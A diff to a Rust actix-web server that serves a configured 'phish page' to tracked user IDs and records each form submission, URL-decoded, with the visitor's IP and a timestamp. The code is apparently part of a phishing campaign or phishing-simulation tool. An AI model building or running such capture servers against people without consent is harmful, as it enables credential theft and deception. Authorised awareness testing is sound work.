@@ -61,6 +61,7 @@ async fn main() -> io::Result<()> {
     log::info!("Starting server on {}", bind_addr);
 
     let index_path = "/index/{id}";
+    let submit_path = "/submit/{id}";
     let image_path = "/image/{id}";
 
     // 4. 服务器启动
@@ -72,7 +73,7 @@ async fn main() -> io::Result<()> {
             .app_data(web::Data::new(ActionTree(Arc::clone(&action_tree))))
             .app_data(web::Data::new(DataTree(Arc::clone(&data_tree))))
             .app_data(web::Data::new(config.clone()))
-            .route("/submit", web::post().to(handle_post))
+            .route(&submit_path, web::post().to(handle_post))
             .route(&index_path, web::get().to(handle_index))
             .route(&image_path, web::get().to(handle_image))
             .route("/success", web::get().to(handle_success))
@@ -140,7 +141,11 @@ async fn handle_index(
 
     // 读取页面文件
     match fs::read_to_string(&config.paths.phish_page) {
-        Ok(content) => HttpResponse::Ok().content_type("text/html").body(content),
+        Ok(content) => {
+            let content = content.replace("{{submit}}", &format!("/submit/{}", user_id));
+
+            HttpResponse::Ok().content_type("text/html").body(content)
+        },
         Err(e) => {
             log::error!("Failed to read phish page: {}", e);
             HttpResponse::InternalServerError().body("Error loading page")
@@ -159,16 +164,23 @@ async fn handle_post(
     let peer_addr = connection_info.peer_addr().unwrap_or("unknown");
 
     // 从 referer 中获取 user_id
-    let referer = req.headers()
-        .get("referer")
-        .and_then(|h| h.to_str().ok())
-        .unwrap_or("");
+    // let user_id = match req.headers()
+    //     .get("referer")
+    //     .and_then(|h| h.to_str().ok())
+    //     .and_then(|referer| {
+    //         let path_segments: Vec<&str> = referer.split('/').collect();
+    //         path_segments.last().cloned()
+    //     }) {
+    //         Some(id) => id.to_string(),
+    //         None => {
+    //             log::error!("无法从referer获取user_id");
+    //             return HttpResponse::BadRequest().body("无效的请求来源");
+    //         }
+    //     };
 
-    // 从 referer URL 中提取 id
-    let user_id = referer
-        .split('/')
-        .last()
-        .unwrap_or("unknown");
+    let user_id = req.match_info()
+        .get("id")
+        .unwrap_or("None");
 
     let timestamp = Utc::now();
     let china_offset = FixedOffset::east_opt(8 * 3600)
@@ -180,7 +192,16 @@ async fn handle_post(
     let timestamp_china = timestamp.with_timezone(&china_offset).to_rfc3339();
 
     let received_text = match std::str::from_utf8(&form) {
-        Ok(v) => v,
+        Ok(v) => {
+            // 对URL编码的数据进行解码
+            match urlencoding::decode(v) {
+                Ok(decoded) => decoded.into_owned(),
+                Err(e) => {
+                    log::error!("Failed to decode URL encoded data: {}", e);
+                    return HttpResponse::BadRequest().body("Invalid form data");
+                }
+            }
+        },
         Err(e) => {
             log::error!("Invalid UTF-8 in form data: {}", e);
             return HttpResponse::BadRequest().body("Invalid form data");
@@ -209,7 +230,7 @@ async fn handle_post(
 
     let action = Action { 
         id: newid_action,
-        user_id: string_to_u8_4_gbk(user_id),
+        user_id: string_to_u8_4_gbk(&user_id),
         time: string_to_u8_32_gbk(&timestamp_china), 
         ip: string_to_u8_32_gbk(peer_addr), 
         atype: U16::new(2), 
@@ -218,7 +239,7 @@ async fn handle_post(
 
     let data = Data {
         id: newid_data,
-        data: string_to_u8_512_gbk(received_text)
+        data: string_to_u8_512_gbk(&received_text)
     };
 
     match create_action(&action_tree.get_tree(), action){
